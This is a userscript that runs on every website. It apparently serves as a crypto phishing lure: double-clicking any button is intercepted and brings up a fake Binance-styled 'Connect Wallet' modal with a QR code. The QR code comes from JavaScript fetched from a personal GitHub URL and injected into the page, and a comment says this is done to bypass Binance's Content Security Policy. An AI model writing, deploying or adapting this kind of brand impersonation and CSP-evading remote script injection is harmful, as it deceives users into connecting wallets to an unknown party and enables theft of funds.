// ==UserScript==
// @name         Binance QR Modal Trigger
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Double-click any button to show a modern Binance UI QR modal.
// @author       You
// @match        *://*/*
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @connect      raw.githubusercontent.com
// ==/UserScript==

(function() {
    'use strict';

    // 1. Inject Modern Binance UI CSS
    GM_addStyle(`
        #bn-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(6px);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        #bn-overlay.bn-active {
            opacity: 1;
        }
        #bn-modal {
            background: #181A20; /* Binance Dark Mode Background */
            border: 1px solid #2B3139;
            border-radius: 16px;
            padding: 32px;
            width: 90%;
            max-width: 380px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            text-align: center;
            transform: scale(0.9);
            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
        }
        #bn-overlay.bn-active #bn-modal {
            transform: scale(1);
        }
        #bn-close-btn {
            position: absolute;
            top: 16px; right: 16px;
            background: transparent;
            border: none;
            color: #848E9C;
            font-size: 24px;
            cursor: pointer;
            transition: color 0.2s;
            line-height: 1;
        }
        #bn-close-btn:hover {
            color: #ffffff;
        }
        #bn-title {
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 8px 0;
        }
        #bn-subtitle {
            color: #848E9C;
            font-size: 14px;
            margin: 0 0 24px 0;
            line-height: 1.5;
        }
        #bn-qr-container {
            background: #ffffff;
            padding: 16px;
            border-radius: 12px;
            width: 220px;
            height: 220px;
            margin: 0 auto 24px auto;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #bn-cta-btn {
            width: 100%;
            background: #FCD535; /* Binance Yellow */
            color: #181A20;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s, opacity 0.2s;
        }
        #bn-cta-btn:hover {
            background: #F0B90B; /* Binance Hover Yellow */
        }
        /* Ensure the injected QR code fits nicely */
        #bn-qr-container canvas, #bn-qr-container img {
            max-width: 100% !important;
            max-height: 100% !important;
        }
    `);

    // 2. Double-Click Event Listener
    document.addEventListener('dblclick', function(e) {
        // Find if we double-clicked a button (or something inside a button)
        const button = e.target.closest('button, [role="button"], .btn, a.btn');

        if (button) {
            e.preventDefault();
            e.stopPropagation();
            openBinanceModal();
        }
    }, true); // Use capture phase to beat site's own scripts

    // 3. Modal Creation and Script Injection
    function openBinanceModal() {
        // Remove existing modal if it's there
        const existingOverlay = document.getElementById('bn-overlay');
        if (existingOverlay) existingOverlay.remove();

        // Build the Modal HTML
        const overlay = document.createElement('div');
        overlay.id = 'bn-overlay';
        overlay.innerHTML = `
            <div id="bn-modal">
                <button id="bn-close-btn">&times;</button>
                <h2 id="bn-title">Start Trading</h2>
                <p id="bn-subtitle">Scan the QR code with your wallet to securely connect and begin trading.</p>

                <div id="bn-qr-container">
                    <!-- The qr.js script will look for this class -->
                    <div class="qr-code"></div>
                </div>

                <button id="bn-cta-btn">Connect Wallet</button>
            </div>
        `;

        document.body.appendChild(overlay);

        // Trigger CSS transition
        setTimeout(() => {
            overlay.classList.add('bn-active');
        }, 10);

        // Close button logic
        document.getElementById('bn-close-btn').addEventListener('click', closeModal);
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) closeModal();
        });

        // Fetch and inject the external QR script
        // We use GM_xmlhttpRequest to bypass Binance's Content Security Policy (CSP)
        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/davidalaba13/qrcode-test/refs/heads/main/qr.js",
            onload: function(response) {
                if (response.status === 200) {
                    // Inject the script into the page context so it can read the DOM
                    const script = document.createElement('script');
                    script.textContent = response.responseText;
                    document.body.appendChild(script);
                } else {
                    console.error("Failed to load QR script");
                }
            },
            onerror: function(err) {
                console.error("Error fetching QR script:", err);
            }
        });
    }

    function closeModal() {
        const overlay = document.getElementById('bn-overlay');
        if (overlay) {
            overlay.classList.remove('bn-active');
            setTimeout(() => overlay.remove(), 300); // Wait for animation to finish
        }
    }
})();
